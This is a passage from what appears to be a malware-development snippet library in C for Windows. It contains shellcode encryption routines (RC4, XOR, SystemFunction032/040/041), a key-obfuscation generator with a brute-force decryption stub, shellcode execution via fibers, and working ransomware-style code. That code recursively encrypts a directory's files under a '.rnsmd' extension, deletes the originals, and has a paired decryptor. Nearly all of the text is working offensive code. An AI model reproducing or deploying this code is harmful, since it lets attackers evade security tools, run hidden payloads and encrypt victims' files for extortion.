	if (!(pOtptBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellcodeSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return NULL;
	}

	RtlSecureZeroMemory(&RC4Ctx, sizeof(Rc4Context));
	rc4Init(&RC4Ctx, pbKey, sKeySize);
	rc4Cipher(&RC4Ctx, pShellcode, pOtptBuffer, sShellcodeSize);

	return pOtptBuffer;
}
```
### RC4 Encryption & Decryption Via NTAPI
```c
#include <windows.h>
#include <stdio.h>

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS (NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);

BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN PBYTE pRc4Key, IN DWORD dwRc4KeySize) {

	NTSTATUS			STATUS				= NULL;
	fnSystemFunction032 SystemFunction032	= NULL;
	USTRING				Buffer				= { .Buffer = pShellcode,	.Length = dwShellcodeSize,	.MaximumLength = dwShellcodeSize };
	USTRING				Key					= { .Buffer = pRc4Key,		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize };

	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryW(L"Advapi32"), "SystemFunction032"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&Buffer, &Key)) != 0x0) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
```
### XOR Encryption & Decryption Using a Multiple-Byte Key
```c
#include <windows.h>
VOID XorByInputKey(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE pbKey, IN SIZE_T sKeySize) {

	for (SIZE_T i = 0x00, j = 0x00; i < sShellcodeSize; i++, j++) {

		if (j == sKeySize)
			j = 0x00;

		if (i % 2 == 0)
			pShellcode[i] = pShellcode[i] ^ pbKey[j];
		else
			pShellcode[i] = pShellcode[i] ^ pbKey[j] ^ j;
	}
}
```
### XOR Encryption & Decryption Using a Single-Byte Key
```c
#include <windows.h>
VOID XorByCounter(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKeyByte) {

	for (SIZE_T i = 0x00, j = 0x00; i < sShellcodeSize; i++, j++){

		if (j == 0xFF)
			j = 0x00;

		pShellcode[i] = pShellcode[i] ^ (bKeyByte + j);
	}
}
```
### Vigenere String Encryption (Unicode)
```c
#include <windows.h>
VOID VigenereEncryptStringW(IN OUT LPWSTR String, IN LPCWSTR Key) {

	INT		keyLen		= wcslen(Key);
	INT		keyIndex	= 0x00;

	for (int i = 0; String[i] != L'\0'; i++) {

		WCHAR x = String[i];

		if (iswalpha(x)) {

			WCHAR Shift = towlower(Key[keyIndex % keyLen]) - L'a';

			if (iswlower(x))
				x = (x - L'a' + (Shift % 26)) % 26 + L'a';
			else if (iswupper(x))
				x = (x - L'A' + (Shift % 26)) % 26 + L'A';

			keyIndex++;
		}

		String[i] = x;
	}
}
```
### Caesar Cipher String Encryption (ASCII)
```c
VOID CeaserEncryptStringA(IN OUT LPSTR String, IN INT Shift) {

	for (int i = 0; String[i] != '\0'; i++){

		CHAR x = String[i];

		if (x >= 'a' && x <= 'z')
			x = (x - 'a' + (Shift % 26)) % 26 + 'a';
		else if (x >= 'A' && x <= 'Z')
			x = (x - 'A' + (Shift % 26)) % 26 + 'A';

		String[i] = x;
	}
}
```
### Caesar Cipher String Encryption (Unicode)
```c
#include <windows.h>
VOID CeaserEncryptStringW(IN OUT LPWSTR String, IN INT Shift) {

	for (int i = 0; String[i] != L'\0'; i++) {

		WCHAR x = String[i];

		if (x >= L'a' && x <= L'z')
			x = (x - L'a' + (Shift % 26)) % 26 + L'a';
		else if (x >= L'A' && x <= L'Z')
			x = (x - L'A' + (Shift % 26)) % 26 + L'A';

		String[i] = x;
	}
}
```
### Vigenere String Encryption (ASCII)
```c
#include <windows.h>
VOID VigenereEncryptStringA(IN OUT LPSTR String, IN LPCSTR Key) {

	INT		keyLen		= strlen(Key);
	INT		keyIndex	= 0x00;

	for (int i = 0; String[i] != '\0'; i++) {

		CHAR x = String[i];

		if (isalpha(x)) {

			CHAR Shift = tolower(Key[keyIndex % keyLen]) - 'a';

			if (islower(x))
				x = (x - 'a' + (Shift % 26)) % 26 + 'a';
			else if (isupper(x))
				x = (x - 'A' + (Shift % 26)) % 26 + 'A';

			keyIndex++;
		}

		String[i] = x;
	}
}
```
### Payload Encryption Via SystemFunction040 and SystemFunction041
```c
#include <windows.h>
#include <stdio.h>
typedef NTSTATUS (NTAPI* fnSystemFunction040)(IN OUT PVOID pMemory, IN ULONG uSize, IN ULONG uFlags);
typedef NTSTATUS (NTAPI* fnSystemFunction041)(IN OUT PVOID pMemory, IN ULONG uSize, IN ULONG uFlags);

BOOL EncryptDecryptSystemFunction04X(IN OUT ULONG_PTR uMemory, IN SIZE_T sLength, IN BOOL bEncrypt) {

	if (!uMemory || !sLength)
		return FALSE;

	fnSystemFunction041		pSystemFunction041	= NULL;
	fnSystemFunction040		pSystemFunction040	= NULL;
	HMODULE					hAdvapi32			= NULL;

	if (!(hAdvapi32 = LoadLibraryW(TEXT("Advapi32")))) {
		printf("[!] LoadLibraryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	// Encrypt :
	if (bEncrypt) {
		if (!(pSystemFunction040 = (fnSystemFunction040)GetProcAddress(hAdvapi32, "SystemFunction040"))) {
			printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			return FALSE;
		}

		return pSystemFunction040((PVOID)uMemory, sLength, 0x00) == 0x00 ? TRUE : FALSE;
	}

	// Decrypt :
	if (!(pSystemFunction041 = (fnSystemFunction041)GetProcAddress(hAdvapi32, "SystemFunction041"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	return pSystemFunction041((PVOID)uMemory, sLength, 0x00) == 0x00 ? TRUE : FALSE;
}
```
### Caesar Cipher String Decryption (ASCII)
```c
#include <windows.h>
VOID CeaserDecryptStringA(IN OUT LPSTR String, IN INT Shift) {

	for (int i = 0; String[i] != '\0'; i++) {

		CHAR x = String[i];

		if (x >= 'a' && x <= 'z')
			x = (x - 'a' - (Shift % 26) + 26) % 26 + 'a';
		else if (x >= 'A' && x <= 'Z')
			x = (x - 'A' - (Shift % 26) + 26) % 26 + 'A';

		String[i] = x;
	}
}
```
### Vigenere String Decryption (Unicode)
```c
#include <windows.h>
VOID VigenereDecryptStringW(IN OUT LPWSTR String, IN LPCWSTR Key) {

	INT		keyLen		= wcslen(Key);
	INT		keyIndex	= 0x00;

	for (int i = 0; String[i] != L'\0'; i++) {

		WCHAR x = String[i];

		if (iswalpha(x)) {

			WCHAR Shift = towlower(Key[keyIndex % keyLen]) - L'a';

			if (iswlower(x))
				x = (x - L'a' - (Shift % 26) + 26) % 26 + L'a';
			else if (iswupper(x))
				x = (x - L'A' - (Shift % 26) + 26) % 26 + L'A';

			keyIndex++;
		}

		String[i] = x;
	}
}
```
### Caesar Cipher String Decryption (Unicode)
```c
#include <windows.h>
VOID CeaserDecryptStringW(IN OUT LPWSTR String, IN INT Shift) {

	for (int i = 0; String[i] != L'\0'; i++) {

		WCHAR x = String[i];

		if (x >= L'a' && x <= L'z')
			x = (x - L'a' - (Shift % 26) + 26) % 26 + L'a';
		else if (x >= L'A' && x <= L'Z')
			x = (x - L'A' - (Shift % 26) + 26) % 26 + L'A';

		String[i] = x;
	}
}
```
### Vigenere String Decryption (ASCII)
```c
#include <windows.h>
VOID VigenereDecryptStringA(IN OUT LPSTR String, IN LPCSTR Key) {

	INT		keyLen		= strlen(Key);
	INT		keyIndex	= 0x00;

	for (int i = 0; String[i] != '\0'; i++) {

		CHAR x = String[i];

		if (isalpha(x)) {

			CHAR Shift = tolower(Key[keyIndex % keyLen]) - 'a';

			if (islower(x))
				x = (x - 'a' - (Shift % 26) + 26) % 26 + 'a';
			else if (isupper(x))
				x = (x - 'A' - (Shift % 26) + 26) % 26 + 'A';

			keyIndex++;
		}

		String[i] = x;
	}
}
```
### Decryption Key Brute Force
```c
#include <Windows.h>
#include <time.h>
#include <stdio.h>

#pragma warning(disable : 4996) // strtok

#define     MIN_KEY_SIZE      2
#define		MAX_KEY_SIZE	128


BYTE EncryptSubmittedKey (IN PBYTE pKeyArray, IN SIZE_T sKeySize) {

    BYTE    HintByte           = pKeyArray[1];
    BYTE    EncryptionByte     = (rand() * pKeyArray[0]) % 0xFF;        // random byte

    for (int i = 0; i < sKeySize; i++)
        pKeyArray[i] = pKeyArray[i] ^ EncryptionByte;

    return HintByte;
}


void PrintDecryptionFunc(IN BYTE bHintByte) {

    printf(
    "BYTE BruteForceDecryption(IN PBYTE pKeyArray, IN SIZE_T sKeySize) {\n\n"
    "\tint i = 0x00;\n\n"
    "\tfor (i = 0; i <= 0xFF; i++){\n\n"
    "\t\tif (((pKeyArray[1] ^ i) %% 0xFF) == 0x%0.2X) {\n"
    "\t\t\tbreak;\n"
    "\t\t}\n"
    "\t}\n\n"
    "\tfor (int x = 0; x < sKeySize; x++)\n"
    "\t\tpKeyArray[x] = pKeyArray[x] ^ i;\n\n"
    "\treturn i;\n"
    "}\n\n\n",
    bHintByte);
}

int PrintHelp(char* argv0) {
    printf("[i] Usage: %s \"{0xHH, 0xHH, ...}\" \n", argv0);
    return -1;
}

int main(int argc, char* argv[]) {

    if (argc != 2)
        return PrintHelp(argv[0]);

    char*           input                   = argv[1];
    char*           token                   = NULL;
    unsigned char   array[MAX_KEY_SIZE]     = { 0 };
    int             array_size              = 0x00;
    byte            hint_byte               = 0x00;

    srand(time(NULL));

    if (input[0] == '{' && input[strlen(input) - 1] == '}') {
        input++;                            // Skip the opening brace
        input[strlen(input) - 1] = '\0';    // Remove the closing brace
    }
    // missing braces
    else {
        return PrintHelp(argv[0]);
    }

    token = strtok(input, ",");
    while (token != NULL) {

        char*   endptr      = NULL;
        long    value       = 0x00;

        if (array_size >= MAX_KEY_SIZE) {
            printf("[!] Submitted Key's Size Exceeds The Maximum Key Length (%d)\n", MAX_KEY_SIZE);
            return -1;
        }

        value = strtol(token, &endptr, 0);
        if (*endptr != '\0' || value < 0 || value > 0xFF) {
            printf("[!] Invalid hexadecimal value: %s\n", token);
            return -1;
        }

        array[array_size++] = (unsigned char)value;
        token = strtok(NULL, ",");
    }

    if (array_size < MIN_KEY_SIZE) {
        printf("[!] Submitted Key's Size Is Less Than The Minimum Key Length (%d)\n", MIN_KEY_SIZE);
        return -1;
    }

    if (array[0] == 0x00 || array[1] == 0x00) {
        printf("[!] The Key Should Start With 2 Non-Zero Bytes \n");
        return -1;
    }

    if (array[0] == array[1]) {
        printf("[!] The First 2 Bytes Should Not Be The Same \n");
        return -1;
    }

    hint_byte = EncryptSubmittedKey(array, array_size);

    printf("\n\n");
    printf("unsigned char ProtectedKey[%d] = { ", array_size);
    for (int i = 0; i < array_size; i++) {
        if (i == array_size - 1)
            printf("0x%02X ", array[i]);
        else
            printf("0x%02X, ", array[i]);
    }
    printf("};\n\n");


    PrintDecryptionFunc(hint_byte);

    return 0;
}
```
### Payload Execution Via Fibers
```c
#include <windows.h>
#include <stdio.h>
BOOL ExecPayloadViaFibers(IN PVOID pStartAddress, IN OPTIONAL ULONG_PTR uParameter) {

	LPVOID	PrimaryFiberAddress			= NULL,
			ShellcodeFiberAddress		= NULL;
	BOOL	bSTATE						= FALSE;

	if (!pStartAddress)
		return FALSE;

	if (!(ShellcodeFiberAddress = CreateFiber(0x00, (LPFIBER_START_ROUTINE)pStartAddress, uParameter))) {
		printf("[!] CreateFiber Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(PrimaryFiberAddress = ConvertThreadToFiber(NULL))) {
		printf("[!] ConvertThreadToFiber Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	bSTATE = TRUE;

	SwitchToFiber(ShellcodeFiberAddress);

_END_OF_FUNC:
	if (!bSTATE && ShellcodeFiberAddress)
		DeleteFiber(ShellcodeFiberAddress);
	if (PrimaryFiberAddress)
		ConvertFiberToThread();
	return bSTATE;
}
```
### Encrypt A Directory's Files
```c
#include <windows.h>
#include <stdio.h>

#define ENCRYPTED_FILE_EXTENSION	L".rnsmd"
#define ENC_FILE_SIGNATURE			'RNSM'

#define MAX_FILE_SIZE_TO_ENC		0x6400000 // 104857600 - 100MB
#define RC4_KEY_SIZE				32

// ===================================================================================================================================================

#define GET_FILE_EXTENSION_W(FilePath)		(wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)

// ===================================================================================================================================================

typedef struct _ENCRYPTED_FILE_HEADER {

	BYTE	Signature			[0x04];
	BYTE	pRc4EncryptionKey	[RC4_KEY_SIZE];

}ENCRYPTED_FILE_HEADER, *PENCRYPTED_FILE_HEADER;

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);

// ===================================================================================================================================================

BOOL Rc4EncryptionViaSystemFunc032(IN ULONG_PTR uFileBuffer, IN DWORD dwFileSize, IN OUT PENCRYPTED_FILE_HEADER pEncryptedFileHdr) {

	NTSTATUS				STATUS					= NULL;
	HMODULE					hAdvapi32				= NULL;
	fnSystemFunction032		SystemFunction032		= NULL;
	unsigned short			us2RightMostBytes		= NULL;
	USTRING					UsBuffer				= { 0 };
	USTRING					UsKey					= { 0 };

	us2RightMostBytes = (unsigned short)(((uFileBuffer & 0xFFFF) ^ (dwFileSize && 0xFF)) % 0xFFFF);

	for (int i = 0; i < RC4_KEY_SIZE; i++) {
		pEncryptedFileHdr->pRc4EncryptionKey[i] = (__TIME__[i % 6] * rand() + us2RightMostBytes) % 0xFF;
		srand(__TIME__[rand() % 6] + us2RightMostBytes);
	}

	UsBuffer.Buffer			= uFileBuffer;
	UsBuffer.Length			= dwFileSize;
	UsBuffer.MaximumLength	= dwFileSize;

	UsKey.Buffer			= pEncryptedFileHdr->pRc4EncryptionKey;
	UsKey.Length			= RC4_KEY_SIZE;
	UsKey.MaximumLength		= RC4_KEY_SIZE;

	if (!(hAdvapi32 = LoadLibraryW(L"Advapi32"))) {
		printf("[!] LoadLibraryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&UsBuffer, &UsKey)) != 0x0) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

// ===================================================================================================================================================


BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {

	HANDLE					hSourceFile						= INVALID_HANDLE_VALUE,
							hDestinationFile				= INVALID_HANDLE_VALUE;
	ULONG_PTR				uFileBufferAddr					= NULL,
							uEncryptedFileBufferAddr		= NULL,
							uTmpPntrVar						= NULL;
	DWORD					dwTmpSizeVar					= 0x00,
							dwFileBufferSize				= 0x00,
							dwNumberOfBytesRead				= 0x00,
							dwNumberOfBytesWritten			= 0x00;
	BOOL					bResult							= FALSE;
	PWCHAR					pwcDuplicateStr					= NULL,
							pwcOgFileExtension				= NULL,
							pwcEncryptedFilePath			= NULL;
	ENCRYPTED_FILE_HEADER	EncryptedFileHeader				= { 0 };
	WCHAR*					szBlackListedExtensions[11]		= { ENCRYPTED_FILE_EXTENSION, L".exe", L".dll", L".sys", L".ini", L".conf", L".cfg", L".reg", L".dat", L".bat", L".cmd" };

	if (!szFilePathToEncrypt)
		return FALSE;

	RtlSecureZeroMemory(&EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));

	if (!(pwcDuplicateStr = _wcsdup(szFilePathToEncrypt)))
		goto _END_OF_FUNC;

	dwTmpSizeVar = (wcslen(pwcDuplicateStr) + wcslen(ENCRYPTED_FILE_EXTENSION) + 0x01) * sizeof(WCHAR);

	if (!(uTmpPntrVar = pwcEncryptedFilePath = (PWCHAR)malloc(dwTmpSizeVar)))
		goto _END_OF_FUNC;
	else
		swprintf_s(pwcEncryptedFilePath, dwTmpSizeVar, L"%s%s", pwcDuplicateStr, ENCRYPTED_FILE_EXTENSION);

	if (!(pwcOgFileExtension = GET_FILE_EXTENSION_W(szFilePathToEncrypt)))
		goto _END_OF_FUNC;

	for (int i = 0; i < 11; i++) {
		if (wcscmp(pwcOgFileExtension, szBlackListedExtensions[i]) == 0x00) {
			printf("[!] Blacklisted File Extension [%ws] \n", szBlackListedExtensions[i]);
			goto _END_OF_FUNC;
		}
	}

	*(ULONG*)&EncryptedFileHeader.Signature = ENC_FILE_SIGNATURE;

	if ((hDestinationFile = CreateFileW(pwcEncryptedFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((hSourceFile = CreateFileW(szFilePathToEncrypt, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileBufferSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (dwFileBufferSize >= MAX_FILE_SIZE_TO_ENC) {
		printf("[!] File Size Exceeds The Limit (100MB) \n");
		goto _END_OF_FUNC;
	}

	if (!(uFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)dwFileBufferSize))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(uEncryptedFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)(dwFileBufferSize + sizeof(ENCRYPTED_FILE_HEADER))))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (SetFilePointer(hDestinationFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hSourceFile, uFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesRead, NULL) || dwFileBufferSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
		printf("[i] Read %d Of %d Bytes\n", dwNumberOfBytesRead, dwFileBufferSize);
		goto _END_OF_FUNC;
	}

	if (*(ULONG*)uFileBufferAddr == ENC_FILE_SIGNATURE) {
		printf("[!] File Already Encrypted \n");
		goto _END_OF_FUNC;
	}

	if (!Rc4EncryptionViaSystemFunc032((PBYTE)uFileBufferAddr, dwFileBufferSize, &EncryptedFileHeader))
		goto _END_OF_FUNC;

	memcpy((PBYTE)uEncryptedFileBufferAddr, &EncryptedFileHeader, sizeof(ENCRYPTED_FILE_HEADER));
	memcpy((PBYTE)(uEncryptedFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER)), (PBYTE)uFileBufferAddr, dwFileBufferSize);

	dwFileBufferSize = dwNumberOfBytesRead + sizeof(ENCRYPTED_FILE_HEADER);

	if (!WriteFile(hDestinationFile, uEncryptedFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesWritten, NULL) || dwFileBufferSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
		printf("[i] Wrote %d Of %d Bytes\n", dwNumberOfBytesWritten, dwFileBufferSize);
		goto _END_OF_FUNC;
	}

	if (!FlushFileBuffers(hDestinationFile)) {
		printf("[!] FlushFileBuffers Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetEndOfFile(hDestinationFile)) {
		printf("[!] SetEndOfFile Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hSourceFile != INVALID_HANDLE_VALUE)
		CloseHandle(hSourceFile);
	if (hDestinationFile != INVALID_HANDLE_VALUE)
		CloseHandle(hDestinationFile);
	if (pwcDuplicateStr)
		free(pwcDuplicateStr);
	if (uTmpPntrVar)
		free(uTmpPntrVar);
	if (uFileBufferAddr)
		LocalFree((HLOCAL)uFileBufferAddr);
	if (uEncryptedFileBufferAddr)
		LocalFree((HLOCAL)uEncryptedFileBufferAddr);
	return bResult;
}

// ===================================================================================================================================================

BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath) {

	if (!szDirectoryPath)
		return FALSE;

	WIN32_FIND_DATAW	FindFileData					= { 0x00 };
	WCHAR				szDirPath[MAX_PATH * 2]			= { 0x00 };
	WCHAR				szFullStrPath[MAX_PATH * 2]		= { 0x00 };
	HANDLE				hFind							= INVALID_HANDLE_VALUE;
	BOOL				bResult							= FALSE;

	_snwprintf_s(szDirPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\*", szDirectoryPath);

	if ((hFind = FindFirstFileW(szDirPath, &FindFileData)) == INVALID_HANDLE_VALUE) {
		printf("[!] FindFirstFileW Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	do {

		if (!wcscmp(FindFileData.cFileName, L".") || !wcscmp(FindFileData.cFileName, L".."))
			continue;

		_snwprintf_s(szFullStrPath, MAX_PATH * 2, MAX_PATH * 2, L"%s\\%s", szDirectoryPath, FindFileData.cFileName);

		if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			printf("[*] Directory: %ws\n", szFullStrPath);

			if (!EncryptFilesInGivenDir(szFullStrPath))
				goto _END_OF_FUNC;
		}

		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			printf("\t> Encrypting File: %ws ... %s \n", szFullStrPath, ReplaceWithEncryptedFile(szFullStrPath) ? "[+] DONE" : "[-] Failed");

	} while (FindNextFileW(hFind, &FindFileData));

	bResult = TRUE;

_END_OF_FUNC:
	if (hFind != INVALID_HANDLE_VALUE)
		FindClose(hFind);
	return bResult;
}
```
### Decrypt An Encrypted Directory's Files
```c
#include <windows.h>
#include <stdio.h>
#define ENCRYPTED_FILE_EXTENSION	L".rnsmd"
#define ENC_FILE_SIGNATURE			'RNSM'

#define RC4_KEY_SIZE				32

// ===================================================================================================================================================

#define GET_FILE_EXTENSION_W(FilePath)		(wcsrchr(FilePath, L'.') ? wcsrchr(FilePath, L'.') : NULL)

// ===================================================================================================================================================

typedef struct _ENCRYPTED_FILE_HEADER {

	BYTE	Signature[0x04];
	BYTE	pRc4EncryptionKey[RC4_KEY_SIZE];

}ENCRYPTED_FILE_HEADER, * PENCRYPTED_FILE_HEADER;

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);

// ===================================================================================================================================================

BOOL Rc4DecryptionViaSystemFunc032(IN ULONG_PTR uFileBuffer, IN DWORD dwFileSize, IN PBYTE pRc4DecryptionKey) {

	NTSTATUS				STATUS				= NULL;
	HMODULE					hAdvapi32			= NULL;
	fnSystemFunction032		SystemFunction032	= NULL;
	USTRING					UsBuffer			= { 0 };
	USTRING					UsKey				= { 0 };

	UsBuffer.Buffer			= uFileBuffer;
	UsBuffer.Length			= dwFileSize;
	UsBuffer.MaximumLength	= dwFileSize;

	UsKey.Buffer			= pRc4DecryptionKey;
	UsKey.Length			= RC4_KEY_SIZE;
	UsKey.MaximumLength		= RC4_KEY_SIZE;

	if (!(hAdvapi32 = LoadLibraryW(L"Advapi32"))) {
		printf("[!] LoadLibraryW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&UsBuffer, &UsKey)) != 0x0) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}


// ===================================================================================================================================================


BOOL DecryptGivenFile(IN LPWSTR szFilePathToDecrypt) {

	HANDLE					hSourceFile						= INVALID_HANDLE_VALUE,
							hDestinationFile				= INVALID_HANDLE_VALUE;
	ULONG_PTR				uFileBufferAddr					= NULL,
							uDecryptedFileBufferAddr		= NULL,
							uTmpPntrVar						= NULL;
	DWORD					dwFileBufferSize				= 0x00,
							dwNumberOfBytesRead				= 0x00,
							dwNumberOfBytesWritten			= 0x00;
	BOOL					bResult							= FALSE;
	PWCHAR					pwcDuplicateStr					= NULL,
							pwcCurrentFileExtension			= NULL,
							pwcLastDot						= NULL;
	PENCRYPTED_FILE_HEADER	pEncryptedFileHeader			= NULL;

	if (!szFilePathToDecrypt)
		return FALSE;

	if (!(uTmpPntrVar = pwcDuplicateStr = _wcsdup(szFilePathToDecrypt)))
		goto _END_OF_FUNC;

	if (!(pwcCurrentFileExtension = GET_FILE_EXTENSION_W(pwcDuplicateStr)))
		goto _END_OF_FUNC;

	if (wcscmp(pwcCurrentFileExtension, ENCRYPTED_FILE_EXTENSION) != 0x00)
		goto _END_OF_FUNC;

	if (!(pwcLastDot = wcsrchr(pwcDuplicateStr, L'.')))
		goto _END_OF_FUNC;

	*pwcLastDot = L'\0';

	if ((hDestinationFile = CreateFileW(pwcDuplicateStr, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((hSourceFile = CreateFileW(szFilePathToDecrypt, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileBufferSize = GetFileSize(hSourceFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(uFileBufferAddr = (ULONG_PTR)LocalAlloc(LPTR, (SIZE_T)dwFileBufferSize))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (SetFilePointer(hSourceFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (SetFilePointer(hDestinationFile, 0x00, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
		printf("[!] SetFilePointer [%d] Failed With Error: %d\n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hSourceFile, uFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesRead, NULL) || dwFileBufferSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d\n", GetLastError());
		printf("[i] Read %d Of %d Bytes\n", dwNumberOfBytesRead, dwFileBufferSize);
		goto _END_OF_FUNC;
	}

	pEncryptedFileHeader = (PENCRYPTED_FILE_HEADER)uFileBufferAddr;
	if (*(ULONG*)pEncryptedFileHeader->Signature != ENC_FILE_SIGNATURE) {
		printf("[!] File Is Not Encrypted \n");
		goto _END_OF_FUNC;
	}

	uDecryptedFileBufferAddr	=	(ULONG_PTR)(uFileBufferAddr + sizeof(ENCRYPTED_FILE_HEADER));
	dwFileBufferSize			=	dwNumberOfBytesRead - sizeof(ENCRYPTED_FILE_HEADER);

	if (!Rc4DecryptionViaSystemFunc032((PBYTE)uDecryptedFileBufferAddr, dwFileBufferSize, pEncryptedFileHeader->pRc4EncryptionKey))
		goto _END_OF_FUNC;

	if (!WriteFile(hDestinationFile, uDecryptedFileBufferAddr, dwFileBufferSize, &dwNumberOfBytesWritten, NULL) || dwFileBufferSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d\n", GetLastError());
		printf("[i] Wrote %d Of %d Bytes\n", dwNumberOfBytesWritten, dwFileBufferSize);
		goto _END_OF_FUNC;
	}

	if (!FlushFileBuffers(hDestinationFile)) {
		printf("[!] FlushFileBuffers Failed With Error: %d\n", GetLastError());
		goto _END_OF_FUNC;
	}

